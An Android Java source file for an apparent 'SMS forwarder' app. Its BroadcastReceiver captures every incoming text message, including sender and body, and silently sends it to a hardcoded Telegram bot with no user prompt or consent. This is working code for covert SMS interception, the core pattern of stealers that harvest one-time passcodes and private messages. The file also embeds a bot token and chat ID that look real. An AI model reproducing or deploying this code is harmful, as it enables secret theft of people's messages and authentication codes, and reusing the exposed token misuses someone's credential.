package com.example.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    // Replace with your actual Bot Token and Chat ID
   private static final String BOT_TOKEN = "8991521894:AAF54TMcZp6-I9TJ7a6SfFNUDdp0EZjFZdM";
private static final String CHAT_ID = "8828331152";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getOriginatingAddress();
                    String messageBody = sms.getMessageBody();

                    String textToSend = "📩 *New SMS Received*\n\nFrom: " + sender + "\nMessage: " + messageBody;

                    sendToTelegram(textToSend);
                }
            }
        }
    }

    private void sendToTelegram(final String msg) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
							"/sendMessage?chat_id=" + CHAT_ID + 
							"&text=" + URLEncoder.encode(msg, "UTF-8") + 
							"&parse_mode=Markdown";

						URL url = new URL(urlString);
						HttpURLConnection conn = (HttpURLConnection) url.openConnection();
						conn.setRequestMethod("GET");
						conn.getResponseCode(); 
						conn.disconnect();
					} catch (Exception e) {
						Log.e("SMS_LOG", "Error: " + e.getMessage());
					}
				}
			}).start();
    }
}

